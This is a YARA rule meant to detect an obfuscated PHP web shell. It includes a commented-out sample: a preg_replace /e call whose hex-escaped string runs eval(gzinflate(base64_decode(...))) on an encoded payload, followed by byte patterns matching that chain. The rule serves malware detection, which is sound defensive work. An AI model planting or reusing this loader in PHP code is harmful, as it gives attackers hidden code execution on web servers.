// <?php $i = 0;
// preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'ZY5BC4IwGEDvgv9hgbDtZErOlewUHaKDh+gUIW77VhNTYSsC8b/Xzl3fg8ezBpHEroTgnNM5juLI/oh1DjxJmn1dn46HK+4u5w7fKEUzCvqpi38pBOalzFQGsmVMF5KxTCtt8sysJWzzsgAcAvBueyJbB2zTaFCjBmJsD80dfKPGwcPgHcHTY9qlqR2ml8eU0grBx/oKLWgJj4kNv1UcLV8='\x29\x29\x29\x3B","."); ?>


rule eval_base64decode_pregreplace: phpshell
{
    meta:
        description = ""
        author = "delyee"
        date = "14.10.2019"
        sha256sum = ""
    strings:
        $h1 = { 70 72 65 67 5f 72 65 70 6c 61 63 65 }
        $h2 = { 5c 78 36 35 5c 78 37 36 5c 78 36 31 5c 78 36 43 5c 78 32 38 5c 78 36 37 5c 78 37 41 5c 78 36 39 5c 78 36 45 5c 78 36 36 5c 78 36 43 5c 78 36 31 5c 78 37 34 5c 78 36 35 5c 78 32 38 5c 78 36 32 5c 78 36 31 5c 78 37 33 5c 78 36 35 5c 78 33 36 5c 78 33 34 5c 78 35 46 5c 78 36 34 5c 78 36 35 5c 78 36 33 5c 78 36 46 5c 78 36 34 5c 78 36 35 5c 78 32 38 27 }
        $h3 = { 5c 78 32 39 5c 78 32 39 5c 78 32 39 }
    condition:
        all of them
}
